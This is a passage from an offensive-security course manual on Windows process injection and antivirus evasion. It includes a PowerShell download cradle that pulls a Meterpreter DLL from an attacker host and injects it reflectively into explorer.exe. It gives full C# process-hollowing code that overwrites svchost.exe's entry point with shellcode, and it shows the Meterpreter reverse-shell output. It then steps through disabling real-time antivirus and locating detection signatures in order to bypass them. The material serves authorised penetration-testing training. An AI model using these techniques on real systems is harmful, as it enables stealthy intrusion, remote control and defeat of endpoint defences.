The ultimate goal of this technique is to maintain the essential functionality of LoadLibrary while 
avoiding the write to disk and avoiding detection by tools such as Process Explorer. 
5.3.2 Reflective DLL Injection in PowerShell 
We’ll reuse the PowerShell reflective DLL injection code (Invoke-ReflectivePEInjection259) 
developed by the security researchers Joe Bialek and Matt Graeber. 
The script performs reflection to avoid writing assemblies to disk, after which it parses the 
desired PE file. It has two separate modes, the first is to reflectively load a DLL or EXE into the 
same process, and the second is to load a DLL into a remote process. 
Since the complete code is almost 3000 lines, we are not going to cover the code itself but rather 
its usage. We must specify a DLL or EXE as an array of bytes in memory, which allows us to 
download and execute it without touching the disk. 
For this exercise, we will use the same Meterpreter DLL that we created earlier. To reflectively 
load a Meterpreter DLL in explorer.exe, we are going to download it using the PowerShell 
DownloadData method, place it in a byte array, and look up the desired process ID. 
 
257 (Stephen Fewer, 2013), https://github.com/stephenfewer/ReflectiveDLLInjection 
258 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/debug/pe-format 
259 (PowerShellMafia, 2016), https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-
ReflectivePEInjection.ps1 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
147 
In order to execute the required commands, we must open a PowerShell window with 
“PowerShell -Exec Bypass”, which allows script execution. Once the window is open, we’ll run the 
commands shown in Listing 183, which will load the DLL into a byte array and retrieve the 
explorer process ID. 
$bytes = (New-Object 
System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll') 
$procid = (Get-Process -Name explorer).Id 
Listing 183 - Downloading DLL and finding Explorer.exe process ID 
To use Invoke-ReflectivePEInjection, we must first import it from its location in C:\Tools with 
Import-Module: 
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1 
Listing 184 - Importing Invoke-ReflectivePEInjection 
Next, we’ll supply the byte array (-PEBytes) and process ID (-ProcId) and execute the script. 
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid 
Listing 185 - Executing Invoke-ReflectivePEInjection 
This loads the DLL in memory and provides us with a reverse Meterpreter shell: 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678) 
 
meterpreter >  
Listing 186 - Getting a reverse shell 
This script produces an error as shown in Listing 187. This does not affect the functionality of the 
script and can be ignored. 
VoidFunc couldn't be found in the DLL 
At C:\Tools\Invoke-ReflectivePEInjection.ps1:2823 char:5 
+                 Throw "VoidFunc couldn't be found in the DLL" 
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
    + CategoryInfo          : OperationStopped: (VoidFunc couldn't be found in the 
DLL:String) [], RuntimeException 
    + FullyQualifiedErrorId : VoidFunc couldn't be found in the DLL 
Listing 187 - Error when executing Invoke-ReflectivePEInjection 
Note that the public version of this script fails on versions of Windows 10 1803 
or newer due to the multiple instances of GetProcAddress in 
UnsafeNativeMethods. Luckily, we have already solved this issue previously and 
the version of the script located on the Windows 10 development machine has 
been updated to avoid this. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
148 
Notice that met.dll is not shown in the loaded DLL listing of Process Explorer. Excellent! 
Note that we could also inject DLLs reflectively from C#, but there are no public 
C# proof-of-concepts that perform remote process injection. However, 
PELoader260 by @subtee demonstrates local process injection. 
5.3.2.1 Exercises 
1. 
Use Invoke-ReflectivePEInjection to launch a Meterpreter DLL into a remote process and 
obtain a reverse shell. Note that Invoke-ReflectivePEInjection.ps1 is in the C:\Tools folder on 
the Windows 10 development VM. 
2. 
Copy Invoke-ReflectivePEInjection to your Kali Apache web server and create a small 
PowerShell download script that downloads and executes it directly from memory. 
5.4 Process Hollowing 
So far, we have successfully injected code into processes such as explorer.exe or notepad.exe. 
Even though our activity is somewhat masked by familiar process names, we could still be 
detected since we are generating network activity from processes that generally do not generate 
it. In this section, we’ll migrate to svchost.exe, which normally generates network activity. 
The problem is that all svchost.exe processes run by default at SYSTEM integrity level, meaning 
we cannot inject into them from a lower integrity level. Additionally, if we were to launch 
svchost.exe (instead of Notepad) and attempt to inject into it, the process will immediately 
terminate. 
To address this, we will launch a svchost.exe process and modify it before it actually starts 
executing. This is known as Process Hollowing261 and should execute our payload without 
terminating it. 
5.4.1 Process Hollowing Theory 
There are a few steps we must perform and components to consider, but the most important is 
the use of the CREATE_SUSPENDED262 flag during process creation. This flag allows us to create 
a new suspended (or halted) process. 
When a process is created through the CreateProcess263 API, the operating system does three 
things: 
1. 
Creates the virtual memory space for the new process. 
 
260 (Arno0x, 2017), https://github.com/Arno0x/CSharpScripts/blob/master/peloader.cs 
261 (Mitre, 2019), https://attack.mitre.org/techniques/T1093/ 
262 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags 
263 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
149 
2. 
Allocates the stack along with the Thread Environment Block (TEB)264 and the Process 
Environment Block (PEB).265 
3. 
Loads the required DLLs and the EXE into memory. 
Once all of these tasks have been completed, the operating system will create a thread to execute 
the code, which will start at the EntryPoint of the executable. If we supply the 
CREATE_SUSPENDED flag when calling CreateProcess, the execution of the thread is halted just 
before it runs the EXE’s first instruction. 
At this point, we would locate the EntryPoint of the executable and overwrite its in-memory 
content with our staged shellcode and let it continue to execute. 
Locating the EntryPoint is a bit tricky due to ASLR266 but once the new suspended process is 
created, we can turn to the Win32 ZwQueryInformationProcess267 API to retrieve certain 
information about the target process, including its PEB address. From the PEB we can obtain the 
base address of the process which we can use to parse the PE headers and locate the EntryPoint. 
Specifically, when calling ZwQueryInformationProcess, we must supply an enum from the 
ProcessInformationClass class. If we choose the ProcessBasicInformation class, we can obtain 
the address of the PEB in the suspended process. We can find the base address of the executable 
at offset 0x10 bytes into the PEB. 
Next, we need to read the EXE base address. While ZwQueryInformationProcess yields the 
address of the PEB, we must read from it, which we cannot do directly because it’s in a remote 
process. To read from a remote process, we’ll use the ReadProcessMemory268 API, which is a 
counterpart to WriteProcessMemory. This allows us to read out the contents of the remote PEB at 
offset 0x10. 
From here, it gets a bit complicated and we need to do a little math, but we begin with the base 
address that we already found. Then we’ll once again use ReadProcessMemory to read the first 
0x200 bytes of memory. This will allow us to analyze the remote process PE header. 
The relevant items are shown in the PE file format header shown below in Table 1. 
Offset 0x00 
0x04 0x08 
0x0C 
0x00 
0x5A4D (MZ) 
 
 
 
0x10 
 
 
 
 
0x20 
 
 
 
 
0x30 
 
 
 
Offset to PE signature 
0x40 
 
 
 
 
0x50 
 
 
 
 
0x60 
 
 
 
 
0x70 
 
 
 
 
 
264 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Win32_Thread_Information_Block 
265 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Process_Environment_Block 
266 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Address_space_layout_randomization 
267 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess 
268 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
150 
0x80 
0x4550 (PE) 
 
 
 
0x90 
 
 
 
 
0xA0 
 
 
AddressOfEntryPoint 
 
0xB0 
 
 
 
 
0xC0 
 
 
 
 
Table 1 - PE file format header 
All PE files must follow this format, which enables us to predict where to read from. First, we read 
the e_lfanew field at offset 0x3C, which contains the offset from the beginning of the PE (image 
base) to the PE Header. This offset is given as 0x80 bytes in Table 1 but can vary from file to file. 
The PE signature found in the PE file format header (above) identifies the beginning of the PE 
header. 
Once we have obtained the offset to the PE header, we can read the EntryPoint Relative Virtual 
Address (RVA) located at offset 0x28 from the PE header. As the name suggests, the RVA is just 
an offset and needs to be added to the remote process base address to obtain the absolute 
virtual memory address of the EntryPoint. Finally, we have the desired start address for our 
shellcode. 
As a fictitious example, imagine we locate the PEB at address 0x3004000. We then use 
ReadProcessMemory to read the executable base address at 0x3004010 and obtain the value 
0x7ffff01000000. 
We use ReadProcessMemory to read out the first 0x200 bytes of the executable and then locally 
inspect the value at address 0x7ffff0100003C to find the offset to the PE header. In our example, 
that value will be 0x110 bytes, meaning the PE header is at 0x7ffff01000110. 
Now we can locate the RVA of the entry point from address 0x7ffff01000138 and add that to the 
base address of 0x7ffff01000000. The result of that calculation is the virtual address of the entry 
point inside the remote process. 
Once we have located the EntryPoint of the remote process, we can use WriteProcessMemory to 
overwrite the original content with our shellcode. We can then let the execution of the thread 
inside the remote process continue. 
The details of this attack may seem daunting but it provides us a way to hide in any process we 
can create, thus masking our presence. 
5.4.2 Process Hollowing in C# 
Now that the process hollowing theory is out of the way, let’s implement it in C#. The very first 
step is to create a suspended process. We have to use the Win32 CreateProcessW API because 
Process.Start269 and similar do not allow us to create a suspended process. 
We’ll create a new Console App project in Visual Studio, and name it “Hollow”. We’ll then find the 
DllImport for CreateProcessW from www.pinvoke.net as shown in Listing 188, and add it to our 
project. 
 
269 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
151 
[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] 
static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,  
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,  
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,  
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION 
lpProcessInformation); 
 
Listing 188 - DllImport statement for CreateProcess 
To import CreateProcessW, we must also include the System.Threading namespace. Some of the 
argument types are unknown to C#, so we’ll later define them manually. 
Let’s examine the function prototype270 to understand what arguments it accepts (Listing 189). 
BOOL CreateProcessW( 
  LPCWSTR               lpApplicationName, 
  LPWSTR                lpCommandLine, 
  LPSECURITY_ATTRIBUTES lpProcessAttributes, 
  LPSECURITY_ATTRIBUTES lpThreadAttributes, 
  BOOL                  bInheritHandles, 
  DWORD                 dwCreationFlags, 
  LPVOID                lpEnvironment, 
  LPCWSTR               lpCurrentDirectory, 
  LPSTARTUPINFOW        lpStartupInfo, 
  LPPROCESS_INFORMATION lpProcessInformation 
); 
 
Listing 189 - CreateProcessW function prototype 
CreateProcessW accepts a very daunting ten parameters but we will only leverage a few of them. 
The first parameter includes the name of the application to be executed and the full command 
line to be executed. Typically, we’ll set lpApplicationName to “null” and lpCommandLine to the full 
path of svchost.exe. 
For lpProcessAttributes and lpThreadAttributes, we’ll need to specify a security descriptor but we 
can submit “null” to obtain the default descriptor. Next, we must specify if any handles in our 
current process should be inherited by the new process, but since we do not care, we can specify 
“false”. 
The dwCreationFlags argument is used to indicate our intention to launch the new process in a 
suspended state. We will set this to the numerical representation of CREATE_SUSPENDED, which 
is 0x4. The next two parameters specify the environment variable settings to be used and the 
current directory for the new application. We will simply set these to “null”. 
Next, we must pass a STARTUPINFO271 structure, which can contain a number of values related 
to how the window of a new process should be configured. We’ll find this on www.pinvoke.net 
(Listing 190) and add the structure to the source code just prior to the DllImport statements. 
 
270 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
createprocessw 
271 (Microsoft, 2018), https://docs.microsoft.com/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
152 
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)] 
struct STARTUPINFO 
{ 
    public Int32 cb; 
    public IntPtr lpReserved; 
    public IntPtr lpDesktop; 
    public IntPtr lpTitle; 
    public Int32 dwX; 
    public Int32 dwY; 
    public Int32 dwXSize; 
    public Int32 dwYSize; 
    public Int32 dwXCountChars; 
    public Int32 dwYCountChars; 
    public Int32 dwFillAttribute; 
    public Int32 dwFlags; 
    public Int16 wShowWindow; 
    public Int16 cbReserved2; 
    public IntPtr lpReserved2; 
    public IntPtr hStdInput; 
    public IntPtr hStdOutput; 
    public IntPtr hStdError; 
} 
Listing 190 - STARTUPINFO structure using P/Invoke 
The final argument is a PROCESS_INFORMATION272 structure that is populated by 
CreateProcessW with identification information about the new process, including the process ID 
and a handle to the process. The P/Invoke definition of PROCESS_INFORMATION is shown in 
Listing 191. 
[StructLayout(LayoutKind.Sequential)] 
internal struct PROCESS_INFORMATION 
{ 
    public IntPtr hProcess; 
    public IntPtr hThread; 
    public int dwProcessId; 
    public int dwThreadId; 
} 
Listing 191 - PROCESS_INFORMATION structure using P/Invoke 
With all of the arguments understood and the required structures defined, we can invoke the call 
by first instantiating a STARTUPINFO and a PROCESS_INFORMATION object and then supply 
them to CreateProcessW. 
STARTUPINFO si = new STARTUPINFO(); 
PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); 
 
bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,  
    IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi); 
Listing 192 - Calling CreateProcess to create a suspended process 
 
272 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-
process_information 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
153 
Next, 
we 
need 
to 
locate 
the 
EntryPoint 
by 
first 
disclosing 
the 
PEB 
through 
ZwQueryInformationProcess. We’ll again use P/Invoke to define the DllImport statement as 
shown in Listing 193. 
[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)] 
private static extern int ZwQueryInformationProcess(IntPtr hProcess,  
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,  
        uint ProcInfoLen, ref uint retlen); 
Listing 193 - DllImport statement for ZwQueryInformationProcess 
The ZwQueryInformationProcess API has many uses, and although most are not officially 
documented by Microsoft, an example that fetches the PEB273 is documented. The function 
prototype is shown in Listing 194. 
NTSTATUS WINAPI ZwQueryInformationProcess( 
  _In_      HANDLE           ProcessHandle, 
  _In_      PROCESSINFOCLASS ProcessInformationClass, 
  _Out_     PVOID            ProcessInformation, 
  _In_      ULONG            ProcessInformationLength, 
  _Out_opt_ PULONG           ReturnLength 
); 
Listing 194 - ZwQueryInformationProcess function prototype 
Let’s inspect this prototype a bit more closely. First, notice the function’s prefix (“Nt” or “Zw”)274 
indicates that the API can be called by either a user-mode program or by a kernel driver 
respectively. For our purposes, we do not have to worry about this as calling the function with 
either prefix will yield the same results in user-space. 
The 
second 
item 
of 
note 
is 
that 
the 
return 
value 
is 
given 
as 
NTSTATUS. 
ZwQueryInformationProcess is a low-level API located in ntdll.dll and returns a hexadecimal value 
directly from the kernel. 
Most of the arguments are relatively simple. The first (ProcessHandle) is a process handle that 
we can obtain from the PROCESS_INFORMATION structure. The API can perform many actions 
depending on the second argument (ProcessInformationClass), which is only partially 
documented. For our purposes, we will set this to ProcessBasicInformation with a numerical 
representation of “0”. 
When we specify ProcessBasicInformation, the third argument (ProcessInformation) must be a 
PROCESS_BASIC_INFORMATION structure that is populated by the API. This structure may be 
found on www.pinvoke.net as shown in Listing 195. 
[StructLayout(LayoutKind.Sequential)] 
internal struct PROCESS_BASIC_INFORMATION 
{ 
    public IntPtr Reserved1; 
    public IntPtr PebAddress; 
    public IntPtr Reserved2; 
    public IntPtr Reserved3; 
 
273 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess 
274 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-nt-and-zw-versions-of-the-native-
system-services-routines 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
154 
    public IntPtr UniquePid; 
    public IntPtr MoreReserved; 
} 
Listing 195 - PROCESS_BASIC_INFORMATION structure 
The remaining two arguments (ProcessInformationLength and ReturnLength) indicate the size of 
the input structure (six IntPtr) and a variable to hold the size of the fetched data, respectively. 
We can now call ZwQueryInformationProcess and fetch the address of the PEB from the 
PROCESS_BASIC_INFORMATION structure: 
PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION(); 
uint tmp = 0; 
IntPtr hProcess = pi.hProcess; 
ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp); 
 
IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10); 
Listing 196 - Calling ZwQueryInformationProcess to fetch PEB address 
The ptrToImageBase variable now contains a pointer to the image base of svchost.exe in the 
suspended process. We will next use ReadProcessMemory to fetch the address of the code base 
by reading eight bytes of memory. 
ReadProcessMemory has a function prototype275 very similar to WriteProcessMemory as shown 
in Listing 197: 
BOOL ReadProcessMemory( 
  HANDLE  hProcess, 
  LPCVOID lpBaseAddress, 
  LPVOID  lpBuffer, 
  SIZE_T  nSize, 
  SIZE_T  *lpNumberOfBytesRead 
); 
Listing 197 - ReadProcessMemory function prototype 
We must supply five parameters for this function. They are a process handle (hProcess), the 
address to read from (lpBaseAddress), a buffer to copy the content into (lpBuffer), the number of 
bytes to read (nSize), and a variable to contain the number of bytes actually read 
(lpNumberOfBytesRead). 
The DllImport statement for ReadProcessMemory is also very similar to that of 
WriteProcessMemory as ahown in Listing 198. 
[DllImport("kernel32.dll", SetLastError = true)] 
static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,  
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead); 
Listing 198 - ReadProcessMemory DllImport statement 
Following the DllImport, we can call ReadProcessMemory by specifying an 8-byte buffer that is 
then converted to a 64bit integer through the BitConverter.ToInt64276 method and then casted to a 
pointer using (IntPtr). 
 
275 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
155 
 
It is worth noting that a memory address takes up eight bytes in a 64-bit process, 
while it only uses four bytes in a 32-bit process, so the use of variable types, 
offsets, and amount of data read must be adapted. 
byte[] addrBuf = new byte[IntPtr.Size]; 
IntPtr nRead = IntPtr.Zero; 
ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead); 
 
IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0)); 
Listing 199 - ReadProcessMemory invocation 
The following step is to parse the PE header to locate the EntryPoint. This is performed by calling 
ReadProcessMemory again with a buffer size of 0x200 bytes (Listing 200). 
byte[] data = new byte[0x200]; 
ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead); 
Listing 200 - Using ReadProcessMemory to fetch the PE header 
To parse the PE header, we must read the content at offset 0x3C and use that as a second offset 
when added to 0x28 as previously discussed and illustrated in Figure 46. 
 
Figure 46: PE header parsing illustration 
To implement this, we convert four bytes at offset 0x3C (e_lfanew field) to an unsigned integer.277 
As stated previously, this is the offset from the image base to the PE header structure. 
Next, we convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. This value 
is the offset from the image base to the EntryPoint. 
 
276 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.bitconverter.toint64?view=netframework-4.8 
277 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.uint32?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
156 
uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C); 
 
uint opthdr = e_lfanew_offset + 0x28; 
 
uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr); 
 
IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase); 
Listing 201 - Parsing the PE header to locate the EntryPoint 
The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual 
address (RVA). We must add it to the image base to obtain the full memory address of the 
EntryPoint. This is done on the last line of Listing 201. 
We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode 
and use WriteProcessMemory to overwrite the existing code as shown in Listing 202. Remember 
that we must add a DllImport statement for WriteProcessMemory before using it. 
byte[] buf = new byte[659] { 
0xfc,0x48,0x83,0xe4,0xf0,0xe8... 
 
WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead); 
Listing 202 - Overwriting the EntryPoint of svchost.exe with shellcode 
Now that everything is set up correctly, we’ll start the execution of our shellcode. In the previous 
techniques, we have called CreateRemoteThread to spin up a new thread but in this case, a thread 
already exists and is waiting to execute our shellcode. 
We can use the Win32 ResumeThread278 API to let the suspended thread of a remote process 
continue its execution. ResumeThread is an easy API to call since it only requires the handle of the 
thread to resume as shown in its function prototype279 in Listing 203. 
DWORD ResumeThread( 
  HANDLE hThread 
); 
Listing 203 - ResumeThread function prototype 
When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION 
structure, it also copied the handle of the main thread into it. We can then import ResumeThread 
and call it directly. 
[DllImport("kernel32.dll", SetLastError = true)] 
private static extern uint ResumeThread(IntPtr hThread); 
... 
 
ResumeThread(pi.hThread); 
Listing 204 - Importing and calling ResumeThread 
We now have all the pieces to create a suspended process, hollow out its original code, replace it 
with our shellcode, and subsequently execute it. 
 
278 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread 
279 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
157 
Once we have combined all the code, we must remember to specify a 64-bit architecture (since 
svchost.exe is a 64-bit process) and change it from “debug” to “release” before compiling. 
When we execute it, the compiled code results in a reverse Meterpreter shell executing inside a 
svchost.exe process, possibly evading suspicion since it is a trusted process that also engages in 
network communications. Excellent! 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678) 
 
meterpreter >  
Listing 205 - Getting a reverse shell 
While the code and technique here only writes shellcode into the suspended 
process, we could also use this technique to hollow280 an entire compiled EXE. 
5.4.2.1 Exercises 
1. 
Replicate the process hollowing technique using shellcode from C#. 
2. 
Modify the code to generate a Jscript file using DotNetToJscript that performs process 
hollowing. 
5.5 Wrapping Up 
In this module, we demonstrated several process injection and migration techniques. We 
explored a typical C# injection into a local process, as well as DLL injection into a remote process. 
We also explored reflective DLL injection that did not write to disk and used process hollowing to 
inject our code into a process that is known to generate network activity. Each of these 
techniques reduced our footprint on the remote system and minimized our chances of detection 
by security software. 
In the next module, we will introduce detection software into our scenario and improve our 
tradecraft to evade it. 
 
280 (M0n0ph1, 2018), https://github.com/m0n0ph1/Process-Hollowing 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
158 
 
6 Introduction to Antivirus Evasion 
Most organizations run managed security and antivirus software to monitor and defend against 
attacks and malware. 
In this module, we will describe how antivirus detection works and demonstrate how it can be 
bypassed. 
6.1 Antivirus Software Overview 
Antivirus software has evolved significantly in the last 20 years. Early implementations of this 
software relied on crude and ineffective detection mechanisms but in order to meet the 
challenges presented by modern malware, most tools now boast advanced capabilities. 
At a basic level, most antivirus software runs on an endpoint machine. Local users can interact 
with the software to run “on-demand” scans against files on the machine. Additionally, most 
products offer “real-time scanning”, in which the software monitors file operations and scans a 
file when it is downloaded or an attempt is made to execute it. In either case, if a malicious file is 
detected, it is either deleted or quarantined. 
Most detection is signature-based. Antivirus vendors use automated processes and manual 
reverse-engineering efforts to create these signatures, which are stored in massive databases. 
While signature algorithms are often close-held secrets, most rely on MD5 or SHA-1 hashes of 
malicious files or on unique byte sequences discovered in known malicious files. If a scanned file 
matches a known hash, or contains a malicious byte sequence, it is flagged as malicious. 
In addition to signature scanning, some software performs heuristics or behavioral analysis that 
simulates execution of a scanned file. Most implementations execute the scanned file in a 
sandboxed environment, attempting to detect known malicious behavior. This approach relies on 
extremely sophisticated, proprietary code and is significantly more time-consuming and resource-
intensive than signature-based detection methods. The success rate of this approach varies 
widely from vendor to vendor. 
A new heuristic detection approach leverages cloud computing along with artificial intelligence to 
improve the speed and accuracy of detection. However, this approach is more costly and is not 
nearly as widely-implemented as signature-based and heuristic-based endpoint solutions. 
In this module, we’ll primarily target the free-to-use ClamAV and Avira antivirus products. 
Although these products do not offer top-tier detection rates, they do employ signature and 
heuristic detection. We will also use online resources to verify our bypass techniques against 
other antivirus products. 
In the following sections, we will demonstrate methods we can use to attempt to bypass 
signature-based and heuristic-based endpoint solutions. 
6.2 Simulating the Target Environment 
When preparing for an engagement, we ideally want to mirror the target system in our local 
environment to verify the effectiveness of our tools. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
159 
However, even if we could predict the target environment, recreating it could be costly as we 
would have to purchase a variety of software licenses. Instead, we could test our payloads 
against multiple antivirus engines at once with various online services. The most popular service 
is VirusTotal,281 which scans against more than fifty antivirus engines. Unfortunately, VirusTotal 
distributes its findings to all associated antivirus vendors, which may divulge our tools and 
techniques before we deploy them. 
Alternatively, we could use AntiScan.Me,282 which provides a similar virus scanning service 
without distributing the results. However, this tool only scans against twenty-six antivirus engines 
and only generates three free scans before requiring a reasonable per-scan paid registration. 
In some of the examples in this module, we will provide scan results from 
AntiScan.Me, but feel free to register an account to verify these results. 
With our use cases in mind, let’s move onwards to the first antivirus bypassing hurdle. 
6.3 Locating Signatures in Files 
To begin, let’s discuss the process of bypassing antivirus signature detection. 
For this exercise, we must disable the heuristics-based scanning portion of the antivirus engine. In 
this section, we are going to rely on ClamAV, which is preinstalled on the Windows 10 victim 
machine and has its heuristics engine disabled. 
Early signature-based detection methods compared file hashes, which meant that detection 
could be evaded by changing a single byte in the scanned file. Obviously this is a trivial exercise. 
Signatures based on byte strings inside the binary are more tricky to bypass as we must 
determine the exact bytes that are triggering detection. There are two primary approaches to this. 
The most complicated approach is to reverse-engineering the antivirus scanning engine and 
signature database to discover the actual signatures. This approach would require a significant 
amount of work and is product-dependent. 
A second, much simpler approach, is to split the binary into multiple pieces and perform an on-
demand scan of sequentially smaller pieces until the exact bytes are found. This method was 
originally implemented in a popular tool called Dsplit.283 
Since the original DSplit tool is no longer available, we will instead rely on the Find-AVSignature284 
PowerShell script for this task. 
Before starting our analysis, we’ll launch the Avira Free Antivirus GUI and open the Antivirus pane. 
In the new window, we’ll click Real-Time Protection and switch it “off” as shown in Figure 47. 
 
281 (VirusTotal, 202), https://www.virustotal.com/gui/home/upload 
282 (antiscan.me, 2018), https://antiscan.me/ 
283 (SecurityFocus, 2010), https://www.securityfocus.com/archive/1/426771 
284 (Chris Campbell, 2012), http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
160 
 
Figure 47: Turning off Avira Real-time scanning 
For this example, we’ll generate a 32-bit Meterpreter executable and copy it to the C:\Tools folder 
on our Windows 10 victim machine. This will serve as our malicious binary. 
Next, we’ll open a PowerShell prompt with the -Exec bypass argument, navigate to the C:\Tools 
directory, and import the Find-AVSignature script as follows: 
PS C:\Users\Offsec> cd C:\Tools 
 
PS C:\Tools> Import-Module .\Find-AVSignature.ps1 
Listing 206 - Importing Find-AVSignature PowerShell script 
The script accepts several arguments. First, we’ll specify the start and end bytes with -
StartByte and -EndByte respectively. In our first run, we’ll specify a starting byte of “0” and an 
ending byte of “max” to scan the entire executable. 
We’ll use the -Interval parameter to specify the size of each individual segment of the file we 
will split. This value will depend on the size of the executable, but since the 32-bit Meterpreter 
executable is roughly 73 KB, we’ll set each segment to 10000 bytes. 
Next, we’ll specify the input file (-Path) and the output folder (-OutPath). We’ll also pass the -
Verbose and -Force flags to gain additional console output and force creation of the specified 
output directory, respectively. 
PS C:\Tools> Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path 
